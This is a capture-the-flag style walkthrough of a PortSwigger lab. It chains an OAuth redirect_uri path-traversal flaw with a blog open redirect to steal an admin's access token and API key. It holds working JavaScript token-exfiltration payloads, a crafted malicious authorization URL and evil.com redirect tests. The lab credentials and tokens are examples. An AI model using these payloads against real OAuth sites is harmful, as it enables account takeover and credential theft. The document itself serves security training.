
# #PortSwigger 


![[Pasted image 20251224233859.png]]


## Lab Description

> This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
> 
> **Objective:** Identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution.
> 
> - **Your credentials:** `wiener:peter
> - The admin user will open anything you send from the exploit server and always has an active session with the OAuth service.
> - You cannot access the admin's API key by simply logging in to their account.

---

## Step 1: Understanding OAuth Flows

**OAuth authorization flow:**
1. Client app redirects user to OAuth provider: `/auth?client_id=X&redirect_uri=Y&response_type=token`
2. User authorizes the app
3. OAuth provider redirects back to `redirect_uri` with an **access token in the URL fragment**
4. Client app extracts token and makes API calls

**The vulnerability chain:**
- OAuth service validates `redirect_uri` against a whitelist but allows path traversal (`/../`)
- Blog website has an open redirect via `/post/next?path=...`
- Combine both → steal access token via exploit server

---

## Step 2: Reconnaissance

### Step 2.1: Complete OAuth Login

1. Click **"My account"**
2. Complete OAuth login with `wiener:peter`
![[Pasted image 20260602211732.png]]
3. Observe the redirect back to the blog website
![[Pasted image 20260602211844.png]]

### Step 2.2: Study the OAuth Request

In Burp Proxy, find the `GET /auth` request:
```
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=token&nonce=123456&scope=openid%20profile%20email
```

![[Pasted image 20260602212107.png]]

Send this request to Repeater.

### Step 2.3: Study the API Call

After login, the blog makes an API call to `/me`:
```
GET /me HTTP/1.1
Authorization: Bearer ACCESS_TOKEN
```

![[Pasted image 20260602212438.png]]
Send this request to Repeater.

---

## Step 3: Testing redirect_uri Validation

### Step 3.1: Test External Domain

In Repeater, try changing `redirect_uri` to an external domain:
```
redirect_uri=https://evil.com
```

**Response:** Error -- external domains are blocked.

### Step 3.2: Test Path Traversal

Try appending `../` to the default redirect_uri:
```
redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
```

![[Pasted image 20260602213422.png]]

![[Pasted image 20260602213401.png]]

**Result:** The OAuth service accepts it! The redirect will go to `/post?postId=1`.

The `redirect_uri` validation is flawed - path traversal is allowed.

---

## Step 4: Finding an Open Redirect

### Step 4.1: Explore Blog Navigation

Scroll to the bottom of any blog post. Look for **"Next post"**.

### Step 4.2: Capture the Redirect Request

Find the `GET /post/next` request:
```
GET /post/next?path=/post?postId=2 HTTP/1.1
```

![[Pasted image 20260602213617.png]]

### Step 4.3: Test for Open Redirect

In Repeater, change the `path` parameter:
```
GET /post/next?path=https://evil.com HTTP/1.1
```

![[Pasted image 20260602213729.png]]

![[Pasted image 20260602213746.png]]
**Response:** `302 Found` redirecting to `https://evil.com`

This is an open redirect! Any domain is allowed.

---

## Step 5: Crafting the Combined Attack URL

### Step 5.1: The Attack Chain

We need a URL that:
1. Initiates OAuth flow
2. Sets `redirect_uri` to the open redirect endpoint
3. Open redirect forwards to exploit server
4. Access token lands on exploit server

### Step 5.2: Construct the Malicious URL

**Base OAuth URL:**
```
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth
```

**Parameters:**

|Parameter|Value|
|---|---|
|`client_id`|YOUR-LAB-CLIENT-ID|
|`redirect_uri`|`https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit`|
|`response_type`|`token`|
|`nonce`|Any number (e.g., `399721827`)|
|`scope`|`openid profile email`|

**Full malicious URL:**
```
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
```


### Step 5.3: Test the URL

Visit the URL in your browser.

**Expected flow:**
1. OAuth provider asks for authorization
2. After authorization, redirects to: `/post/next?path=https://exploit-server.net/exploit`
3. Open redirect sends to: `https://exploit-server.net/exploit#access_token=...    

Access token appears in the URL fragment!

---

## Step 6: Creating the Exploit Script

### Step 6.1: Basic Token Stealer

On the exploit server, create `/exploit`:
```
<script>
    window.location = '/?' + document.location.hash.substr(1);
</script>
```

![[Pasted image 20260602214202.png]]

This redirects to the exploit server's root with the token as a query parameter.

### Step 6.2: Test the Exploit

1. Store the exploit on the exploit server
2. Visit your malicious URL again
3. Check **Access log** on exploit server

**Expected log entry:**
```
GET /?access_token=eyJhbGciOiJSUzI1NiIsImtpZCI6...
```

![[Pasted image 20260602214541.png]]

Token successfully stolen!

---

## Step 7: Creating the Full Delivery Exploit

### Step 7.1: Self-Contained Payload

Create an exploit that:
1. Redirects to OAuth flow if no token
2. Exfiltrates token when present

```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email';
    } else {
        window.location = '/?' + document.location.hash.substr(1);
    }
</script>
```

### Step 7.2: Test the Full Exploit

1. Store the exploit on the exploit server
2. Click **View exploit**
3. Check access log for the token
![[Pasted image 20260602214832.png]]

---

## Step 8: Delivering to the Victim

1. Click **Deliver exploit to victim**
2. The admin user will open your exploit
![[Pasted image 20260602214858.png]]

3. Check exploit server **Access log**
![[Pasted image 20260602214921.png]]

```
10.0.4.215      2026-06-02 16:18:42 +0000 "GET /?access_token=0Ko1aQbdBUpWZZ6muWVyrb_cSAD-Tx53D5IL-LiaDLo&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

**Copy the full access token:**
```
0Ko1aQbdBUpWZZ6muWVyrb_cSAD-Tx53D5IL-LiaDLo
```

---

## Step 9: Obtaining the Admin's API Key

### Step 9.1: Use the Stolen Token

In Burp Repeater, go to the `GET /me` request:
```
GET /me HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Authorization: Bearer STOLEN_ACCESS_TOKEN
```

![[Pasted image 20260602215151.png]]

### Step 9.2: Extract the API Key

**Response:**
```
{
	"sub":"administrator",
	"apikey":"qK1cYpy0HnQ8inxc8dQuo9JkdqPCEI7e",
	"name":"Administrator",
	"email":"administrator@normal-user.net",
	"email_verified":true
}
```

![[Pasted image 20260602215225.png]]

Copy the `apikey` value.
```
qK1cYpy0HnQ8inxc8dQuo9JkdqPCEI7e
```


---

## Step 10: Submitting the Solution

1. Go back to the lab page
2. Click **Submit solution** (button in the lab banner)
3. Paste the API key
![[Pasted image 20260602215436.png]]

4. Click **Submit**

---

## Step 11: Lab Solved

Success message displayed:

![[Pasted image 20260602215502.png]]

---
---
